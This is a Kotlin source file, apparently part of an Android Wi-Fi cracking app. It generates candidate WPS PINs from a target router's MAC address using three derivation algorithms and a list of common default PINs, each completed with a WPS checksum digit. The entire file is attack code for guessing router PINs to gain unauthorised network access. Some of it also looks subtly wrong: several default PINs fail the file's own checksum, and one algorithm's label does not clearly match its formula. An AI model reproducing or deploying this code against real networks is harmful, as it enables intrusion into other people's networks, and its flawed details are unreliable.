package com.eni.wificracker

object WpsPinGen {

    fun pinsFor(bssid: String): List<String> {
        val mac = bssid.replace(":", "").uppercase()
        if (mac.length != 12) return commonPins
        val out = mutableListOf<String>()

        // Algorithm 1: last 7 digits of MAC + checksum
        try {
            val last7 = mac.takeLast(7).toLong(16).toString().padStart(7, '0').takeLast(7)
            out += last7 + wpsChecksum(last7)
        } catch (_: Exception) {}

        // Algorithm 2: 24-bit NIC -> decimal mod 10000000
        try {
            val nic = mac.takeLast(6).toLong(16)
            val pin = (nic % 10000000).toString().padStart(7, '0')
            out += pin + wpsChecksum(pin)
        } catch (_: Exception) {}

        // Algorithm 3: Zhao/ComputePIN (Belkin/D-Link style)
        try {
            val n = mac.takeLast(6).toLong(16)
            val pin = ((n xor 0x55AA55) and 0xFFFFFF).toString().takeLast(7).padStart(7, '0')
            out += pin + wpsChecksum(pin)
        } catch (_: Exception) {}

        // Common defaults
        out += commonPins
        return out.distinct()
    }

    private val commonPins = listOf(
        "12345670", "00000000", "01234567", "11111110",
        "22222220", "33333330", "44444440", "55555550",
        "66666660", "77777770", "88888880", "99999990",
        "12345678", "87654321", "20172017"
    )

    private fun wpsChecksum(pin7: String): String {
        val d = pin7.map { it.digitToInt() }
        var acc = 0
        acc += 3 * d[0]; acc += d[1]; acc += 3 * d[2]; acc += d[3]
        acc += 3 * d[4]; acc += d[5]; acc += 3 * d[6]
        val cs = (10 - acc % 10) % 10
        return cs.toString()
    }
}